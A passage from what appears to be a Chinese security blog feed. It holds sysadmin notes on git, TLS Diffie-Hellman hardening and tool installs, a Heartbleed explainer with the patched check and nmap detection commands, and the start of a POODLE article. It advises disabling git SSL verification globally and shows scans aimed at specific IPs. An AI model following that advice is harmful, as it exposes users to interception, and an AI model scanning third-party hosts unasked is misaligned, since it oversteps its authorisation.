to ‘<a href="https://github.com/m01ly/gitalk.git&#39;">https://github.com/m01ly/gitalk.git&#39;</a></p><p><strong>解决方案：</strong>因为 GitHub 从今年 10 月 1 日起，在该平台上创建的所有新的源代码仓库将默认被命名为 “main”，而不是原先的”master” ，因此运行git branch查看名称，</p><p>a.如果是main，直接运行以下即可。</p><pre><code>git push -u origin main</code></pre><p>b.若为master，则改为按如下方式把本地的 master 仓库名称修改为远端的 main即可：</p><p>重命名命令： git branch -m oldBranchName newBranchName</p><p>例如： git branch -m master main</p><p>再重新push：git push -u origin main</p><p>打开git项目，发现提交成功：</p><p><img src="/2020/09/03/m01ly-wiki/1615357682554.png" alt="1615357682554"></p><p>参考：</p><p><a href="https://www.cnblogs.com/chen8023miss/p/12082093.html">git上传linux文件到GitHub上</a></p><p><a href="https://blog.csdn.net/u014361280/article/details/109703556">Git 常见错误 之 error: src refspec xxx does not match any / error: failed to push some refs to 简单解决方法</a></p><h2 id="linux下载git文件"><a href="#linux下载git文件" class="headerlink" title="linux下载git文件"></a>linux下载git文件</h2><p>(1) gitclone项目</p><pre><code>git clone https://github.com/m01ly/gitalk</code></pre><p>报错</p><pre><code>[root@xxx]# git clone https://github.com/m01ly/gitalkCloning into &#39;gitalk&#39;...fatal: unable to access &#39;https://github.com/m01ly/gitalk/&#39;: Problem with the SSL CA cert (path? access rights?)</code></pre><p>解决方案：将http.sslVerify参数的git全局配置为’false’</p><pre><code>root@xxx:~# git config --global http.sslVerify false</code></pre><h1 id="TLS-安全配置"><a href="#TLS-安全配置" class="headerlink" title="TLS 安全配置"></a>TLS 安全配置</h1><h2 id="DHparam"><a href="#DHparam" class="headerlink" title="DHparam"></a>DHparam</h2><h3 id="Diffie-Hellman-group-smaller-than-2048-bits-漏洞"><a href="#Diffie-Hellman-group-smaller-than-2048-bits-漏洞" class="headerlink" title="Diffie-Hellman group smaller than 2048 bits 漏洞"></a>Diffie-Hellman group smaller than 2048 bits 漏洞</h3><p><strong>漏洞描述：</strong></p><ol><li>Diffie-Hellman group smaller than 2048 bits：</li></ol><p>TLS服务器使用Diffie-Hellman组，质数模长度小于2048位。目前的估计是，一个学术团队可以打破768位素数，而一个国家级团队可以打破1024位素数。</p><ol start="2"><li>TLS/SSL Server Is Using Commonly Used Prime Numbers </li></ol><p>在Diffie-Hellman密钥交换期间，服务器使用一个公共素数或默认质数作为参数。这使得安全会话容易受到预计算攻击。攻击者可以花费大量时间为特定质数生成查找/彩虹表。然后，可以使用此查找表获取握手的共享机密并解密会话。</p><p><strong>漏洞分析：</strong></p><p>漏洞1，只需要重新生成2048位DH参数即可。</p><p>漏洞2，因为用了已知的素数，会导致爆破后破解出密钥，因此只需要升级到2048位参数，在2048位DH组下进行这种攻击的可行性被评估为不确定且未经证实。</p><p><strong>漏洞解决方法：</strong>重新生成2048位dhparams。nginx配置如下，其他容器详见<a href="https://weakdh.org/sysadmin.html">https://weakdh.org/sysadmin.html</a> 。</p><p>1 利用openssl生成2048bit dhparams.pem命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">openssl dhparam -out dhparams.pem 2048<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>dh协议文件生成速度随长度增长而急剧增长，使用随机数种子可以加快生成速度，如下所示</p><pre class="line-numbers language-bash"><code class="language-bash">openssl dhparam -rand rand.seed -out dhparams.pem 2048<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2 nginx配置 （nginx.conf文件）：ssl_dhparam dhparams.pem的路径; </p><p><strong>参考：</strong></p><p><a href="https://weakdh.org/sysadmin.html">官方TLS部署Diffie-Hellman指南，包括apache,iis环境下的配置</a>   </p><p>TLS 的nginx安全配置](<a href="https://gist.github.com/fotock/9cf9afc2fd0f813828992ebc4fdaad6f">https://gist.github.com/fotock/9cf9afc2fd0f813828992ebc4fdaad6f</a>)  </p><p><a href="https://kb.fortinet.com/kb/documentLink.do?externalID=FD43985">https://kb.fortinet.com/kb/documentLink.do?externalID=FD43985</a>   <a href="https://www.rapid7.com/db/vulnerabilities/tls-dh-primes">https://www.rapid7.com/db/vulnerabilities/tls-dh-primes</a> 解决方法</p><p><a href="https://www.openssl.org/docs/man1.1.0/man1/dhparam.html">openssl生成 dhparam具体用法</a>  </p><p><a href="https://weakdh.org/logjam.html">https://weakdh.org/logjam.html</a>   <a href="https://weakdh.org/">https://weakdh.org/</a> 相关DH的攻击</p><p><a href="https://www.cnblogs.com/f-ck-need-u/p/7103791.html">加快生成速度</a>  </p><h1 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h1><h2 id="centos-安装sqlmap"><a href="#centos-安装sqlmap" class="headerlink" title="centos 安装sqlmap"></a>centos 安装sqlmap</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># git clone https://github.com/sqlmapproject/sqlmap.git</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd sqlmap</span><span class="token punctuation">[</span>root@m01ly sqlmap<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ./sqlmap.py -h</span>        ___       __H__ ___ ___<span class="token punctuation">[</span>.<span class="token punctuation">]</span>_____ ___ ___  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;1.4.9.1#dev&amp;#125;</span><span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token keyword">.</span> <span class="token punctuation">[</span>,<span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token keyword">.</span><span class="token string">'| . ||___|_  [,]_|_|_|__,|  _|      |_|V...       |_|   http://sqlmap.orgUsage: python sqlmap.py [options]Options:  -h, --help            Show basic help message and exit  -hh                   Show advanced help message and exit  --version             Show program'</span>s version number and <span class="token keyword">exit</span>  -v VERBOSE            Verbosity level: 0-6 <span class="token punctuation">(</span>default 1<span class="token punctuation">)</span>  Target:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="centos-安装最新nmap"><a href="#centos-安装最新nmap" class="headerlink" title="centos 安装最新nmap"></a>centos 安装最新nmap</h2><p><a href="https://www.linuxidc.com/topicnews.aspx?tid=14">CentOS</a> 7下直接yum安装nmap</p><pre><code># yum install nmap发现并不是最新版本，而且升级一下看看，发现也不能直接升级。只好再直接yum卸载掉。**按官方文档rpm安装最新版本的nmap**[root@localhost www.linuxidc.com]# rpm -vhU https://nmap.org/dist/nmap-7.80-1.x86_64.rpm获取https://nmap.org/dist/nmap-7.80-1.x86_64.rpm准备中...             ################################# [100%]正在升级/安装... 1:nmap-2:7.80-1          ################################# [100%]</code></pre><h1 id="源码安装nmap"><a href="#源码安装nmap" class="headerlink" title="源码安装nmap"></a>源码安装nmap</h1><pre><code>wget https://nmap.org/dist-old/nmap-4.53.tgztar -zxvf nmap-4.53.tgzcd nmap-4.53./configuremakemake installnmap -v</code></pre><p><a href="https://nmap.org/dist-old/">https://nmap.org/dist-old/</a></p><p><a href="https://www.jianshu.com/p/b86c3b114cce">https://www.jianshu.com/p/b86c3b114cce</a></p><h2 id="查看linux具体系统"><a href="#查看linux具体系统" class="headerlink" title="查看linux具体系统"></a>查看linux具体系统</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># lsb_release -a</span>LSB Version:    :core-4.1-amd64:core-4.1-noarch:cxx-4.1-amd64:cxx-4.1-noarch:desktop-4.1-amd64:desktop-4.1-noarch:languages-4.1-amd64:languages-4.1-noarch:printing-4.1-amd64:printing-4.1-noarchDistributor ID: CentOSDescription:    CentOS Linux release 7.7.1908 <span class="token punctuation">(</span>Core<span class="token punctuation">)</span>Release:        7.7.1908Codename:       Core<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="安装kali"><a href="#安装kali" class="headerlink" title="安装kali"></a>安装kali</h2><p><a href="https://blog.csdn.net/qq_43645782/article/details/106190796">https://blog.csdn.net/qq_43645782/article/details/106190796</a></p><p>修改root密码</p><pre class="line-numbers language-bash"><code class="language-bash">root@m01ly:~<span class="token comment" spellcheck="true"># sudo passwd root</span>新的 密码：重新输入新的 密码：passwd：已成功更新密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="centos-安装AWVS"><a href="#centos-安装AWVS" class="headerlink" title="centos 安装AWVS"></a>centos 安装AWVS</h1><p><a href="https://blog.lfoder.cn/2020/06/04/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-AWVS-Nessus-Docker%E7%89%88/">https://blog.lfoder.cn/2020/06/04/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-AWVS-Nessus-Docker%E7%89%88/</a> </p><h1 id="centos-安装docker"><a href="#centos-安装docker" class="headerlink" title="centos 安装docker"></a>centos 安装docker</h1><p><img src="/2020/09/03/m01ly-wiki/1612343038903.png" alt="1612343038903"></p><h4 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。</p><pre><code>$ sudo yum remove docker \         docker-client \         docker-client-latest \         docker-common \         docker-latest \         docker-latest-logrotate \         docker-logrotate \         docker-engine</code></pre><h4 id="安装-Docker-Engine-Community"><a href="#安装-Docker-Engine-Community" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h4><p>可以选择国内的一些aliyun源地址：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum-config-manager \    --add-repo \    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="安装-Docker-Engine-Community-1"><a href="#安装-Docker-Engine-Community-1" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h4><p>安装最新版本的 Docker Engine-Community 和 containerd，或者转到下一步安装特定版本：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> yum <span class="token function">install</span> docker-ce docker-ce-cli containerd.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="启动-Docker。"><a href="#启动-Docker。" class="headerlink" title="启动 Docker。"></a>启动 Docker。</h4><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过运行 hello-world 映像来验证是否正确安装了 Docker Engine-Community 。</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> docker run hello-world<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/03/m01ly-wiki/1603272603871.png" alt="1603272603871"></p><h1 id="docker-访问宿主机目录"><a href="#docker-访问宿主机目录" class="headerlink" title="docker 访问宿主机目录"></a>docker 访问宿主机目录</h1><h2 id="挂载一个目录"><a href="#挂载一个目录" class="headerlink" title="挂载一个目录"></a>挂载一个目录</h2><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -v <span class="token variable">$path_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path_in_docker</span> deep_sleepnet:1.0 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 执行之后，相当于把此数据目录挂载在对应docker的目录中，用  即可查看并访问所挂载数据。Dockerfile中最后一行运行相应的 </p><p>例如：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker run -it -m 4G -v /var/log/suricata:/mnt -p 5601:5601 -p 9200:9200 -p 5044:5044 sebp/elk: 638</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker ps -a</span>CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                                                              NAMES45a7bc7b174d        sebp/elk:623        <span class="token string">"/usr/local/bin/star…"</span>   13 hours ago        Up 12 hours         0.0.0.0:5044-<span class="token operator">></span>5044/tcp, 0.0.0.0:5601-<span class="token operator">></span>5601/tcp, 0.0.0.0:9200-<span class="token operator">></span>9200/tcp, 9300/tcp   charming_wu<span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker exec -it 45a7bc7b174d bash</span>root@45a7bc7b174d:/<span class="token comment" spellcheck="true"># ls</span>bd_build  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到宿主机文件夹mnt</p><p><img src="/2020/09/03/m01ly-wiki/1603765650364.png" alt="1603765650364"></p><h2 id="挂载两个目录"><a href="#挂载两个目录" class="headerlink" title="挂载两个目录"></a>挂载两个目录</h2><p>注意每个目录前都要加参数-v</p><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -v <span class="token variable">$path_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path_in_docker</span> -v <span class="token variable">$path1_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path1_in_docker</span> deep_sleepnet:1.0 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="docker-compose命令不存在、未找到命令"><a href="#docker-compose命令不存在、未找到命令" class="headerlink" title="docker-compose命令不存在、未找到命令"></a>docker-compose命令不存在、未找到命令</h1><p>安装扩展源</p><pre><code>sudo yum -y install epel-release</code></pre><p>安装python-pip模块</p><pre><code>sudo yum install python-pip</code></pre><p>查看docker-compose版本,<strong>提示未找到命令</strong></p><pre><code>./docker-compose version</code></pre><p><img src="/2020/09/03/m01ly-wiki/1611136362318.png" alt="1611136362318"></p><p>通过以命令进行安装</p><pre><code>cd /usr/local/bin/wget https://github.com/docker/compose/releases/download/1.14.0-rc2/docker-compose-Linux-x86_64rename docker-compose-Linux-x86_64 docker-compose docker-compose-Linux-x86_64chmod +x /usr/local/bin/docker-compose./usr/local/bin/docker-compose versionsudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose#加个软连接docker-compose version</code></pre><p><img src="/2020/09/03/m01ly-wiki/1611136334326.png" alt="1611136334326"></p><p><img src="/2020/09/03/m01ly-wiki/1611136724260.png" alt="1611136724260"></p><p>卸载</p><pre><code>sudo rm /usr/local/bin/docker-compose</code></pre><p>升级</p><p><a href="https://github.com/docker/compose/releases/">查看最新版本</a>，选择版本复制链接即可。</p><p><img src="/2020/09/03/m01ly-wiki/1611137297043.png" alt="1611137297043"></p><pre><code>cd /usr/local/bin/wget https://github.com/docker/compose/releases/download/1.28.0/docker-compose-Linux-x86_64rename docker-compose-Linux-x86_64 docker-compose docker-compose-Linux-x86_64chmod +x /usr/local/bin/docker-compose./usr/local/bin/docker-compose versionsudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose#加个软连接docker-compose version</code></pre><h1 id="wps打开CSV乱码"><a href="#wps打开CSV乱码" class="headerlink" title="wps打开CSV乱码"></a>wps打开CSV乱码</h1><p>（1）使用记事本打开CSV文件</p><p>（2）点击菜单：文件-另存为，编码方式选择ANSI</p><h1 id="kali安装pip"><a href="#kali安装pip" class="headerlink" title="kali安装pip"></a>kali安装pip</h1><p><a href="https://www.cnblogs.com/fzblog/p/12940714.html">https://www.cnblogs.com/fzblog/p/12940714.html</a></p><h1 id="CentOS-7升级Python到3-5后yum出错"><a href="#CentOS-7升级Python到3-5后yum出错" class="headerlink" title="CentOS 7升级Python到3.5后yum出错"></a><a href="https://www.cnblogs.com/linkxu1989/p/6955137.html">CentOS 7升级Python到3.5后yum出错</a></h1><p>solution:将下面两个文件的开头改为从!/usr/bin/python 改成!/usr/bin/python2.7 </p><pre><code>vi /usr/bin/yumvi /usr/libexec/urlgrabber-ext-down  </code></pre>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2020/09/03/m01ly-wiki/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>TLS攻击之心脏滴血</title>
      <link>https://m01ly.github.io/2020/09/03/htps-attack-heartbleed/</link>
      <guid>https://m01ly.github.io/2020/09/03/htps-attack-heartbleed/</guid>
      <pubDate>Thu, 03 Sep 2020 02:10:29 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;一-心脏滴血介绍&quot;&gt;&lt;a href=&quot;#一-心脏滴血介绍&quot; class=&quot;headerlink&quot; title=&quot;一 心脏滴血介绍&quot;&gt;&lt;/a&gt;一 心脏滴血介绍&lt;/h1&gt;&lt;p&gt; &lt;strong&gt;心脏滴血漏洞(CVE-2014-0160)&lt;/strong&gt; 是一个出现在加密程序库OpenSSL的安全漏洞，openssl是用于实现TLS协议的库。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;受影响的版本：&lt;/strong&gt; OpenSSL1.0.1、1.0.1a 、1.0.1b 、1.0.1c 、1.0.1d 、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等版本 &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;影响范围&lt;/strong&gt;：只要使用的是存在缺陷的OpenSSL实例，无论是服务器还是客户端，都可能因此而受到攻击。 因为缺陷在于OpenSSL的实现，而不是SSL/TLS协议本身，所以除了OpenSSL之外的其他TLS实现方式，如GnuTLS、Mozilla的网络安全服务（NSS）和Windows平台的TLS实现都不受影响。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞原理：&lt;/strong&gt;在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查，因此漏洞的名称来源于“心跳”（heartbeat）。该程序错误属于缓冲区过读，即可以读取的数据比应该允许读取的还多 。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一-心脏滴血介绍"><a href="#一-心脏滴血介绍" class="headerlink" title="一 心脏滴血介绍"></a>一 心脏滴血介绍</h1><p> <strong>心脏滴血漏洞(CVE-2014-0160)</strong> 是一个出现在加密程序库OpenSSL的安全漏洞，openssl是用于实现TLS协议的库。</p><p><strong>受影响的版本：</strong> OpenSSL1.0.1、1.0.1a 、1.0.1b 、1.0.1c 、1.0.1d 、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等版本 </p><p><strong>影响范围</strong>：只要使用的是存在缺陷的OpenSSL实例，无论是服务器还是客户端，都可能因此而受到攻击。 因为缺陷在于OpenSSL的实现，而不是SSL/TLS协议本身，所以除了OpenSSL之外的其他TLS实现方式，如GnuTLS、Mozilla的网络安全服务（NSS）和Windows平台的TLS实现都不受影响。</p><p><strong>漏洞原理：</strong>在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查，因此漏洞的名称来源于“心跳”（heartbeat）。该程序错误属于缓冲区过读，即可以读取的数据比应该允许读取的还多 。</p><a id="more"></a><h1 id="二-漏洞原理分析"><a href="#二-漏洞原理分析" class="headerlink" title="二 漏洞原理分析"></a>二 漏洞原理分析</h1><h2 id="2-1-心跳机制"><a href="#2-1-心跳机制" class="headerlink" title="2.1 心跳机制"></a>2.1 心跳机制</h2><p> TLS / SSL协议的一个重要组成部分被称为“心跳”。从本质上讲，<strong>心跳就是两台电脑互相通信从而让对方知道它们仍然相连，即使用户没有下载或上传任何东西。</strong></p><p><strong>（1） 正常心跳检测</strong></p><p>每过一段时间，浏览器会发送一个加密的数据到服务器端，这被称为心跳请求，至关重要的是，心跳请求里包含自己的长度信息。例如下图中，</p><p><strong>客户端：</strong>内容为abcdefghij,，自己的长度为10字节 。</p><p><strong>服务器</strong>：收到消息时，会分配一个内存缓冲区（一个物理内存区域用以存储信息），该区域的存储空间和心跳请求信号里的长度一致，即10字节。接下来，它会存储请求信号的加密数据到内存缓冲区，然后读取数据并将其发送回你的浏览器，来证明连接仍然存在。</p><p><img src="/2020/09/03/htps-attack-heartbleed/1599116465905.png" alt="1599116465905"></p><p><strong>（2） 心脏滴血</strong></p><p> 心脏出血漏洞的出现是因为，**OpenSSL的心跳功能缺少了一个至关重要的安全维护手段：计算机接受心跳请求时从不检查该请求和它声称的内容是否一致，及从不检查所请求的数据长度是否和声称的数据长度一致，导致响应方返回额外长度的数据，具体如下图所示：</p><p><strong>客户端心跳请求：</strong>abcdefghij,，心跳长度为10字节 。</p><p><strong>服务器端：</strong>接收心跳数据后，没有对心跳请求数据长度和声称 的10字节长度进行检查，直接分配200字节缓存区，存储心跳数据。返回数据时，从缓冲区读取200字节的数据返回给客户端。这时候缓冲区可能会存在密钥，用户名，密码等隐私信息（可想而知payload需要精心构造以读取有用的隐私信息，这里仅仅简单描述攻击原理）。</p><p><img src="/2020/09/03/htps-attack-heartbleed/1599117066503.png" alt="1599117066503"></p><h2 id="2-2-心脏出血错误代码"><a href="#2-2-心脏出血错误代码" class="headerlink" title="2.2 心脏出血错误代码"></a>2.2 心脏出血错误代码</h2><p>导致心脏出血漏洞的编程错误可以归于一行代码：</p><pre><code>memcpy(bp, pl, payload);</code></pre><p>memcpy()是复制数据的命令。bp是被复制的数据的存储区域，pl是被复制的数据的来源，payload是被复制的数据长度。<strong>问题在于，该命令没有检验pl复制的数据是否和payload给予的长度相符。</strong></p><h1 id="3-修复心脏滴血漏洞"><a href="#3-修复心脏滴血漏洞" class="headerlink" title="3 修复心脏滴血漏洞"></a>3 修复心脏滴血漏洞</h1><p>修补心脏出血漏洞的方式是更新最新的OpenSSL版本，你可以在官网上获取相关链接 <a href="https://www.openssl.org/source/">https://www.openssl.org/source/</a> 。</p><p>因为OpenSSL是开源的，以下是<strong>修复过的代码</strong>： 代码的第一部分的功能是确定心跳请求的大小不是0KB，不然可能会出错。第二部分用来检验心跳的长度是否和它声称的相符。 </p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">*</span> Read type <span class="token operator">and</span> payload length first<span class="token operator">*</span><span class="token operator">/</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">></span> s<span class="token operator">-</span><span class="token operator">></span>s3<span class="token operator">-</span><span class="token operator">></span>relent<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">/</span>silently discard <span class="token operator">*</span><span class="token operator">/</span>hbtype <span class="token operator">=</span> <span class="token operator">*</span>p<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">;</span>n2s<span class="token punctuation">(</span>p<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">></span> s<span class="token operator">-</span><span class="token operator">></span>s3<span class="token operator">-</span><span class="token operator">></span>rrec<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">/</span> silently discard per RFC <span class="token number">6520</span> sec<span class="token punctuation">.</span> <span class="token number">4</span> <span class="token operator">*</span><span class="token operator">/</span>pl <span class="token operator">=</span> p<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-心脏滴血漏洞检测"><a href="#4-心脏滴血漏洞检测" class="headerlink" title="4  心脏滴血漏洞检测"></a>4  心脏滴血漏洞检测</h1><h2 id="4-1-nmap"><a href="#4-1-nmap" class="headerlink" title="4.1  nmap"></a>4.1  nmap</h2><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 443 --script ssl-heartbleed 66.175.219.225或者nmap -sV --script<span class="token operator">=</span>ssl-heartbleed 111.X.X.53 -p 443<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其他检测TLS工具也可检测，具体见：<a href="https://m01ly.github.io/2020/08/26/htps-tools/">TLS检测小工具</a> </p><h2 id="4-2-网上在线检测"><a href="#4-2-网上在线检测" class="headerlink" title="4.2 网上在线检测"></a>4.2 网上在线检测</h2><p> <a href="http://possible.lv/tools/hb/">http://possible.lv/tools/hb/</a> </p><p> <a href="http://filippo.io/Heartbleed/">http://filippo.io/Heartbleed/</a> </p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>1  <a href="https://www.aqniu.com/news-views/28453.html">https://www.aqniu.com/news-views/28453.html</a>   通俗易懂</p><p>2 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</a>  漏洞详情</p><p>3 <a href="https://blog.csdn.net/yaofeiNO1/article/details/54428021">https://blog.csdn.net/yaofeiNO1/article/details/54428021</a>  可利用的payload</p><p>4 <a href="https://www.cnblogs.com/KevinGeorge/p/8029947.html">https://www.cnblogs.com/KevinGeorge/p/8029947.html</a>   POC</p><p>5<a href="https://zh.wikipedia.org/wiki/%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E">https://zh.wikipedia.org/wiki/%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E</a>  wiki</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/TLS/">TLS</category>
      
      
      <comments>https://m01ly.github.io/2020/09/03/htps-attack-heartbleed/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>TLS 攻击之POODLE</title>
      <link>https://m01ly.github.io/2020/09/01/htps-attack-paddingoracle/</link>
      <guid>https://m01ly.github.io/2020/09/01/htps-attack-paddingoracle/</guid>
      <pubDate>Tue, 01 Sep 2020 03:20:23 GMT</pubDate>
      
      <description>&lt;p&gt;转载 &lt;a href=&quot;http://www.bewindoweb.com/272.html%EF%BC%8C%E5%85%B7%E4%BD%93%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90%EF%BC%8C%E5%86%99%E7%9A%84%E5%BE%88%E5%A5%BD%EF%BC%8C%E7%84%B6%E5%90%8E%E6%96%87%E7%AB%A0%E6%88%91%E5%8A%A0%E5%85%A5%E4%BA%86%E8%87%AA%E5%B7%B1%E7%9A%84%E7%90%86%E8%A7%A3%E3%80%82&quot;&gt;http://www.bewindoweb.com/272.html，具体实例分析，写的很好，然后文章我加入了自己的理解。&lt;/a&gt;&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>转载 <a href="http://www.bewindoweb.com/272.html%EF%BC%8C%E5%85%B7%E4%BD%93%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90%EF%BC%8C%E5%86%99%E7%9A%84%E5%BE%88%E5%A5%BD%EF%BC%8C%E7%84%B6%E5%90%8E%E6%96%87%E7%AB%A0%E6%88%91%E5%8A%A0%E5%85%A5%E4%BA%86%E8%87%AA%E5%B7%B1%E7%9A%84%E7%90%86%E8%A7%A3%E3%80%82">http://www.bewindoweb.com/272.html，具体实例分析，写的很好，然后文章我加入了自己的理解。</a></p><a id="more"></a><h2 id="一、-POODLE简介"><a href="#一、-POODLE简介" class="headerlink" title="一、 POODLE简介"></a>一、 POODLE简介</h2><p>2014年9月Google的一份研究报告<a href="https://www.openssl.org/~bodo/ssl-poodle.pdf">《This POODLE Bites: Exploiting The SSL 3.0 Fallback》</a>指出，SSL存在安全漏洞CVE­-2014-3566，代号为POODLE（Padding Oracle On Downgraded Legacy Encryption，基于降级旧加密协议的填充提示），该漏洞可以使得攻击者获取到一段明文数据，比如HTTP的cookie。</p><p><strong>漏洞影响版本：</strong>SSL v3.0以下</p><p><strong>防御方法：</strong>完全禁用SSL，或者利用TLS_FALLBACK_SCSV字段禁止协议降级到SSL</p><h1 id="二、Padding-Oracle-攻击原理"><a href="#二、Padding-Oracle-攻击原理" class="headerlink" title="二、Padding Oracle 攻击原理"></a>二、Padding Oracle 攻击原理</h1><p>Padding Oracle是Web程序渗透的经典攻击方式，由Juliano Rizzo和Thai Duong于2010年<a href="http://netifera.com/research/">《Practical Padding Oracle Attacks》</a>提出，该攻击利用CBC（Cipher-block chaining，密码块链接模式）加密模式中的填充漏洞给出的提示信息逐步推导出明文数据。</p><h2 id="2-1-CBC密码块链接模式——加密"><a href="#2-1-CBC密码块链接模式——加密" class="headerlink" title="2.1 CBC密码块链接模式——加密"></a><strong>2.1 CBC密码块链接模式——加密</strong></h2><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950607286.png" alt="1598950607286"></p><p>（1）对明文进行分组，每组长度相同（一般为8字节或16字节），对长度不足的分组需要进行填充（Padding）。</p><p>填充通常遵循的是PKCS5标准，即填充的字符是需要填充字符的个数。</p><p>例如，这里的明文字符串为“GET /a 